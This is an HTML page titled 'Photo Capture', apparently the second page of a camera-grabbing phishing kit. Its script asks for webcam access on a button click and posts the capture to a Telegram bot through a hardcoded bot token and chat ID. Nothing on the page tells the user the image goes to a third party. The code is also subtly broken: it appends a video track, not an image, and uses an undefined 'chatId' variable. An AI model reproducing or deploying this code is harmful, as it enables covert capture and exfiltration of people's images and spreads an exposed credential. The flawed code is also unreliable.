<!-- capture.html (Second Page) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture</title>
</head>
<body>

<script>
    window.onload = function() {
        document.getElementById('captureButton').addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    var formData = new FormData();
                    formData.append('photo', stream.getVideoTracks()[0], 'photo.jpg');
                    formData.append('chat_id', '-1002121820675'); // Replace with your actual chat ID

                    var botToken = '6946661358:AAF7MtPL0ELXvcXp54RNhFjhKANUMjJ6PIU';

                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log("Image sent to Telegram!");
                        } else {
                            console.error("Failed to send image to Telegram.");
                        }
                    })
                    .catch(error => {
                        console.error("Error sending image:", error);
                    });

                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(error => {
                    console.error("Error accessing the camera:", error);
                    alert("Camera access denied or an error occurred. Please allow camera access and try again.");
                });
        });
    };
</script>

<button id="captureButton">Capture Photo</button>

</body>
</html>
